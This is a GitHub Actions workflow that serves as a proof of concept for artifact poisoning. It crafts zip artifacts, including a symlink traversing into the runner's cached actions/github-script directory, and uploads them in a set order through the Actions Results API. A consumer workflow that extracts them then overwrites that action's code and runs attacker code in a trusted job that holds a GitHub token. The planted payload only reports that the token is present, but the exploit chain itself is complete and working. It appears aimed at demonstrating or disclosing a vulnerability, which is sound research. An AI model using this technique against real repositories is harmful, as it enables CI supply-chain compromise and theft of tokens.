name: Two Artifact Pivot Producer

on:
  workflow_dispatch:
  push:
    branches:
      - main
    paths:
      - .github/workflows/owned-gei-reader.yml

permissions:
  contents: read

jobs:
  produce:
    runs-on: ubuntu-latest
    steps:
      - name: Build benign pivot archives
        shell: bash
        env:
          TARGET_ACTION_SHA: 3a2844b7e9c422d3c10d287c895573f7108da1b3
        run: |
          set -euo pipefail

          mkdir -p "$RUNNER_TEMP/pivot/dist"
          cat > "$RUNNER_TEMP/pivot/dist/index.js" <<'PAYLOAD'
          const fs = require('fs');

          const marker = process.env.BENIGN_TRUSTED_MARKER;
          const githubToken = process.env['INPUT_GITHUB-TOKEN'];
          if (marker !== 'GH_GE_I_ACTION_OVERWRITE_7F4C') {
            throw new Error('benign trusted marker was not present');
          }
          if (!githubToken) {
            throw new Error('trusted action token was not present');
          }

          fs.appendFileSync(process.env.GITHUB_OUTPUT, 'owned=true\n');
          fs.appendFileSync(process.env.GITHUB_OUTPUT, 'token_present=true\n');
          fs.appendFileSync(
            process.env.GITHUB_STEP_SUMMARY,
            'PASS: attacker-authored action code ran in the trusted workflow_run job; its token was present but was not printed or transmitted.\n',
          );
          console.log('PASS: benign trusted action overwrite executed; token_present=true');
          PAYLOAD
          (
            cd "$RUNNER_TEMP/pivot"
            zip -q -r "$RUNNER_TEMP/pivot.zip" dist
          )

          mkdir -p "$RUNNER_TEMP/dot"
          ln -s "../../../_actions/actions/github-script/$TARGET_ACTION_SHA" "$RUNNER_TEMP/dot/pivot"
          (
            cd "$RUNNER_TEMP/dot"
            zip -q -y "$RUNNER_TEMP/dot.zip" pivot
          )

          mkdir -p "$RUNNER_TEMP/answer"
          cp "$RUNNER_TEMP/pivot/dist/index.js" "$RUNNER_TEMP/answer/unused.txt"
          (
            cd "$RUNNER_TEMP/answer"
            zip -q "$RUNNER_TEMP/answer.zip" unused.txt
          )

      - name: Upload pivot artifacts through the Actions Results service
        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
        with:
          github-token: ${{ github.token }}
          script: |
            const crypto = require('crypto');
            const fs = require('fs');
            const path = require('path');
  
            const token = process.env.ACTIONS_RUNTIME_TOKEN;
            const resultsURL = process.env.ACTIONS_RESULTS_URL;
            if (!token || !resultsURL) throw new Error('missing Actions artifact runtime input');
  
            const payloadPart = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
            const payload = JSON.parse(Buffer.from(payloadPart, 'base64').toString('utf8'));
            const resultScope = String(payload.scp || '')
              .split(' ')
              .find(scope => scope.startsWith('Actions.Results:'));
            if (!resultScope) throw new Error('Actions.Results scope missing');
            const [, workflowRunBackendId, workflowJobRunBackendId] = resultScope.split(':');
            const origin = new URL(resultsURL).origin;
  
            async function rpc(method, body) {
              const response = await fetch(
                `${origin}/twirp/github.actions.results.api.v1.ArtifactService/${method}`,
                {
                  method: 'POST',
                  headers: {
                    Authorization: `Bearer ${token}`,
                    'Content-Type': 'application/json',
                  },
                  body: JSON.stringify(body),
                },
              );
              if (!response.ok) throw new Error(`${method} failed with HTTP ${response.status}`);
              return response.json();
            }
  
            async function upload(name, archivePath) {
              const create = await rpc('CreateArtifact', {
                workflowRunBackendId,
                workflowJobRunBackendId,
                name,
                version: 7,
                mimeType: 'application/zip',
              });
              if (!create.ok || !create.signedUploadUrl) {
                throw new Error(`CreateArtifact returned no upload URL for ${JSON.stringify(name)}`);
              }
  
              const bytes = fs.readFileSync(archivePath);
              const response = await fetch(create.signedUploadUrl, {
                method: 'PUT',
                headers: {
                  'Content-Type': 'application/zip',
                  'Content-Length': String(bytes.length),
                  'x-ms-blob-type': 'BlockBlob',
                },
                body: bytes,
              });
              if (!response.ok) throw new Error(`blob upload failed with HTTP ${response.status}`);
  
              const hash = crypto.createHash('sha256').update(bytes).digest('hex');
              const finalize = await rpc('FinalizeArtifact', {
                workflowRunBackendId,
                workflowJobRunBackendId,
                name,
                size: String(bytes.length),
                hash: `sha256:${hash}`,
              });
              if (!finalize.ok) throw new Error(`FinalizeArtifact failed for ${JSON.stringify(name)}`);
            }
  
            // The REST artifact list is descending by artifact ID. Creating
            // "pivot" before "." makes the consumer extract "." first. The older "A"
            // record is consumed by Info-ZIP as its noninteractive "All" reply
            // when the payload replaces the action's existing entry point.
            await upload('A', path.join(process.env.RUNNER_TEMP, 'answer.zip'));
            await upload('pivot', path.join(process.env.RUNNER_TEMP, 'pivot.zip'));
            await upload('.', path.join(process.env.RUNNER_TEMP, 'dot.zip'));
            console.log('Uploaded benign three-artifact pivot');
